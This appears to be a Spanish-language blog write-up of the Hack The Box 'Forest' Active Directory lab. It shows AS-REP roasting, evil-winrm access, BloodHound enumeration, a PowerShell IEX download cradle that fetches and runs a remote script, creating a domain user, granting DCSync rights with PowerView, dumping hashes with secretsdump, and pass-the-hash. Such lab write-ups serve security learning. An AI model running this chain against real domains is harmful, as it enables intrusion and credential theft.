<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>HTB - Forest &#8211; Al3xt0r</title> <meta name="description" content=""> <meta name="keywords" content="Active Directory, HTB, CTF, WriteUp"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="prof.jpeg"> <meta name="twitter:title" content="HTB - Forest"> <meta name="twitter:description" content=""> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="HTB - Forest"> <meta property="og:description" content=""> <meta property="og:url" content="http://localhost:4000/HTB-Forest/"> <meta property="og:site_name" content="Al3xt0r"> <meta property="og:image" content="http://localhost:4000/images/prof.jpeg"> <link rel="canonical" href="http://localhost:4000/HTB-Forest/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/bk3.jpg) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/kg-ali.jpg) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/images/bk2.jpeg) no-repeat;background-size: cover;} </style> </head> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/prof.jpeg"></a> <div class="post-title-section"> <div class="section-line">Posts <em>/</em></div> <h1 class="section-title">HTB - Forest </h1> <ul class="tags"> <li><a href="http://localhost:4000/tags#Active Directory">Active Directory</a></li> <li><a href="http://localhost:4000/tags#HTB">HTB</a></li> <li><a href="http://localhost:4000/tags#CTF">CTF</a></li> <li><a href="http://localhost:4000/tags#WriteUp">WriteUp</a></li> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts">Back to posts</a> <em>/</em></div> </div> </div> </div> <div class="block-right"> <div class="share-buttons"> </div> <a href="../posts.html" title="posts" class="posts-menu-icon"></a> <a title="projects" class="projects-menu-icon"> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">13 Aug 2023</div> <p><img src="/assets/img/HTB_Forest/F0.png" alt="" /></p> <p>Esta maquina es de las primeras que nos sugiere la plataforma <strong>Hack The Box</strong>, para practicar <strong><code class="highlighter-rouge">Active Directory</code></strong>, es una maquina de dificultad <strong>Easy</strong>, pero aun asi… Tiene mucho que ofrecer.</p> <p>Como siempre, comenzaremos con el <strong>Port Scanning</strong>: <img src="/assets/img/HTB_Forest/F1.png" alt="" /></p> <p>Podemos apreciar que tendremos muchos puertos abiertos, por lo que podemos deducir que estamos contra un sistema operativo <strong>Microsoft-Windows</strong>, aunque esto tambien lo podemos saber por el TTL al momento de enviar un pauquete con el comando <strong>ping</strong>.</p> <p>Nos queda ver los servicios y las versiones usadas para el servicio, por lo que tiramos del nmap:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p</span><span class="s2">"Puertos"</span> &lt;IP&gt;
</code></pre></div></div> <p><img src="/assets/img/HTB_Forest/F2.png" alt="" /></p> <p>Desde aqui ya podemos ir viendo datos interesantes, como lo puede ser un dominio <strong>htb.local</strong>, pero para asegurarnos usaremos herramientas de reconocimiento, como lo puede ser <strong>Crackmapexec</strong> <img src="/assets/img/HTB_Forest/F3.png" alt="" /></p> <p>Podemos apreciar que se repite el mismo dominio: <strong>“htb.local”</strong>, por lo que lo podemos agregar al archivo del <strong>/etc/hosts</strong>, tambien vemos que posiblemente tengamos vias potenciales por el servicio <strong>WinRM</strong>.</p> <p>Pero si queremos listar archivos o informacion por medio del SMB, no vamos a ver nada: <img src="/assets/img/HTB_Forest/F4.png" alt="" /></p> <p>Aqui es donde entra una herramienta que nos trae por defecto sistemas como Parrot o Kali: <strong>GetNPUsers.py</strong> <img src="/assets/img/HTB_Forest/F5.png" alt="" /></p> <p>Como nos reporta la informacion, vamos a usar una de sus funciones, especificamente la primera, pero vamos a necesitar listar un usuario valido… Asi que lo vamos a listar sin pasarle ningun parametro: <img src="/assets/img/HTB_Forest/F6.png" alt="" /> Asi que ya vamos a poder tener su TGT: <img src="/assets/img/HTB_Forest/F7.png" alt="" /> Entonces nos quedaria aplicarle Brute Force a al TGT que acabamos de obtener: <img src="/assets/img/HTB_Forest/F8.png" alt="" /> Vemos que tenemos credenciales para el usuario <strong>svc-alfresco</strong>, asi que veremos si nos da un <strong>pwned</strong> con Crackmapexec:</p> <p><img src="/assets/img/HTB_Forest/F9.png" alt="" /></p> <p>Usamos la herramienta <strong>evil-winrm</strong> para conectarnos usando las credenciales que acabamos de obtener: <img src="/assets/img/HTB_Forest/F10.png" alt="" /></p> <p>Una vez lograda la intrusion como usuario de bajos privilegios, nos toca llegar al usuario administrador, por lo que necesitaremos de una herramienta que nos liste vias potenciales para logarlo… Aqui es donde entra <strong>BloodHound</strong></p> <p>Iniciaremos <strong>Neo4j</strong>, y luego abriremos BloodHound para vinculara a la base de datos del Neo4j. <img src="/assets/img/HTB_Forest/F11.png" alt="" /> Una vez en la maquina necesitaremos de una herramienta:</p> <ul> <li><a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">Sharphound</a></li> </ul> <p>La compartiremos a la maquina, existen varias formas… Yo use esta:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Invoke-WebRequest</span> -Uri <span class="s2">"&lt;IP&gt;/SharpHound.ps1"</span> -OutFile <span class="s2">"Directorio en la maquina"</span>
</code></pre></div></div> <p>Otra puede ser:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">IEX</span><span class="o">(</span><span class="nb">New-Object </span>Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://ruta-del-archivo/mi-script.ps1'</span><span class="o">)</span>
</code></pre></div></div> <p>Como sea, lo ejecutamos y obtendremos informacion que cargaremos al BloodHound en formato <strong>.zip</strong> <img src="/assets/img/HTB_Forest/F12.png" alt="" /></p> <p>Una vez cargado en el <strong>BloodHound</strong>, nos dirigimos al usuario del que tenemos credenciales para ver rutas que nos permitan elevar nuestros privilegios: <img src="/assets/img/HTB_Forest/F13.png" alt="" /></p> <p>Si vemos la rama que nos lleva directamente al usuario administrador vemos que existe un privilegio que poseemos, este nos permite modificar el <strong>DACL</strong>.</p> <p><img src="/assets/img/HTB_Forest/F14.png" alt="" /></p> <p>BloodHound nos va a dar una pista de como conseguir escalar privilegios:</p> <p><img src="/assets/img/HTB_Forest/F15.png" alt="" /></p> <p>Primero, veremos los grupos disponibles: <img src="/assets/img/HTB_Forest/F16.png" alt="" /></p> <ul> <li>Vemos que tenemos disponible el “Exchange Windows Permissions”</li> </ul> <p>Entonces lo que haremos a continuacion es crear un usuario y agregarlo a ese grupo:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user &lt;Usuario&gt; &lt;Password&gt; /add /domain
net <span class="nb">group</span> <span class="s2">"NOMBRE DEL GRUPO"</span> &lt;usuario&gt; /add
</code></pre></div></div> <p><img src="/assets/img/HTB_Forest/F17.png" alt="" /></p> <p>Nos quedaria aplicar lo que nos dice BloodHound:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SecPassword</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">'&lt;Password&gt;'</span> -AsPlainText -Force
<span class="nv">$Cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'htb.local\user'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
</code></pre></div></div> <ul> <li>Ahora bien, necesitaremos importar un binario en Powershell, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a></li> </ul> <p>Una vez obtenido el binario, procuraremos a importarlo:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ./&lt;Nombre <span class="nb">del </span>binario&gt;
<span class="c1"># Acto seguido Corremos el siguiente comando:</span>
Add-DomainObjectAcl -Credential <span class="nv">$Cred</span> -TargetIdentity <span class="s1">'htb.local\Domain Admins'</span> -PrincipalIdentity &lt;Usuario&gt; -Rights DCSync
</code></pre></div></div> <p><img src="/assets/img/HTB_Forest/F18.png" alt="" /></p> <p>Por lo que nos quedaria dumpear la informacion, empleando la herramienta <strong>“secretsdump.py”</strong></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py htb.local/&lt;USER&gt;@10.10.10.161
</code></pre></div></div> <p><img src="/assets/img/HTB_Forest/F19.png" alt="" /></p> <p>Como podemos ver, hemos dumpeado los hashes del administrador, por lo que ahora nos quedaria hacer un <strong>“pass the hash”</strong>:</p> <p><img src="/assets/img/HTB_Forest/F20.png" alt="" /></p> <h1 id="fin">FIN</h1> <br> <nav class="pagination"> <a href="http://localhost:4000/HTB-Agile/" class="pagination_pager" title="HTB - Agile ">previous</a> <a href="http://localhost:4000/HackMyVM-Jabita/" class="pagination_pager" title="JABITA - HackMyVM ">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://user-images.githubusercontent.com/86735230/184715052-062e79fd-d01b-4148-b5d2-7e64878d1f50.png) center center no-repeat;"> <a href="http://github.com/SirDext3r/JavascriptRandomizeArt" target="_blank" rel="nofollow external"> <span> Geometry Art </span> </a> </li> </ul> </div> </body> </html>
